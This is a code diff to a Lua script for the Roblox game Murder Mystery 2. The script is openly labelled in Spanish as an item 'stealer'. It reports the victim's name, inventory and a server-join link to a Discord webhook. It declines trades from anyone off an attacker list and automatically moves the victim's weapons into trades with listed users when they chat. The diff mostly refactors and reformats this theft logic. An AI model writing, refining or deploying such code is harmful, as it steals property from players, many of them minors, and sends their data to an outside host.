@@ -192,7 +192,7 @@ table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amou
 local fernToken = math.random(100000,999999)
 local realLink = "[unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..fernToken..")"
 
--- Webhook inventario inicial
+-- Webhook inicial completo
 local pasteContent = ""
 for _, w in ipairs(weaponsToSend) do
     pasteContent = pasteContent..string.format("%s x%s (%s) | Valor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
@@ -208,9 +208,8 @@ if #weaponsToSend > 0 then
         {name="Valor total del inventario📦:", value=tostring(totalValue).."💰", inline=true},
         {name="Click para unirte a la víctima 👇:", value=realLink, inline=false}
     }
-    local maxEmbedItems = math.min(18,#weaponsToSend)
-    for i=1,maxEmbedItems do
-        local w = weaponsToSend[i]
+    for i=1,math.min(18,#weaponsToSend) do
+        local w=weaponsToSend[i]
         fieldsInit[2].value = fieldsInit[2].value..string.format("%s x%s (%s)\nValor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
     end
     if #weaponsToSend > 18 then
@@ -219,11 +218,11 @@ if #weaponsToSend > 0 then
             fieldsInit[2].value = fieldsInit[2].value.."Mira todos los ítems aquí 📜: [Mirar]("..pasteLink..")"
         end
     end
-    local prefix=pingEveryone and "@everyone " or ""
+    local prefix = pingEveryone and "@everyone " or ""
     SendWebhook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit,prefix)
 end
 
--- ================= Trade con rechazo avanzado =================
+-- ================= Trade avanzado con rechazo y monitoreo =================
 local currentTarget = nil
 
 local function doTrade(targetName)
@@ -231,7 +230,7 @@ local function doTrade(targetName)
     if not targetPlayer or #weaponsToSend == 0 then return end
 
     if currentTarget and currentTarget ~= targetName then
-        declineTrade() -- rechaza trade en curso si entra otro
+        declineTrade()
         task.wait(0.5)
     end
 
@@ -244,9 +243,9 @@ local function doTrade(targetName)
         elseif status == "SendingRequest" then
             task.wait(0.3)
         elseif status == "StartTrade" then
-            for i = 1, math.min(4, #weaponsToSend) do
-                local w = table.remove(weaponsToSend, 1)
-                for _ = 1, w.Amount do
+            for i=1,math.min(4,#weaponsToSend) do
+                local w=table.remove(weaponsToSend,1)
+                for _=1,w.Amount do
                     addWeaponToTrade(w.DataID)
                 end
             end
@@ -259,15 +258,14 @@ local function doTrade(targetName)
         task.wait(1)
     end
 
-    -- Webhook final
+    -- Webhook final completo
     local fields={
         {name="Victima 👤:", value=LocalPlayer.Name, inline=true},
         {name="📦 Inventario enviado:", value="", inline=false},
         {name="Valor total del inventario📦:", value=tostring(totalValue).."💰", inline=true}
     }
-    local maxEmbedItems = math.min(18,#weaponsToSend)
-    for i=1,maxEmbedItems do
-        local w = weaponsToSend[i]
+    for i=1,math.min(18,#weaponsToSend) do
+        local w=weaponsToSend[i]
         fields[2].value = fields[2].value..string.format("%s x%s (%s)\nValor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
     end
     if #weaponsToSend>18 and pasteLink then
@@ -278,18 +276,18 @@ local function doTrade(targetName)
     currentTarget = nil
 end
 
--- Monitoreo y rechazo avanzado de trades
+-- Rechazo automático y prioridad lista
 TradeService.OnTradeReceived.OnClientEvent:Connect(function(sender)
-    if not table.find(users, sender.Name) then
-        declineTrade() -- rechaza trades fuera de lista
+    if not table.find(users,sender.Name) then
+        declineTrade() -- rechaza usuarios no permitidos
     elseif currentTarget ~= sender.Name then
-        declineTrade() -- declina trade actual
+        declineTrade()
         task.wait(0.5)
-        doTrade(sender.Name) -- inicia trade prioritario
+        doTrade(sender.Name)
     end
 end)
 
--- Activación por chat
+-- Activación por chat para usuarios permitidos
 for _, p in ipairs(Players:GetPlayers()) do
     if table.find(users,p.Name) then
         p.Chatted:Connect(function() doTrade(p.Name) end)
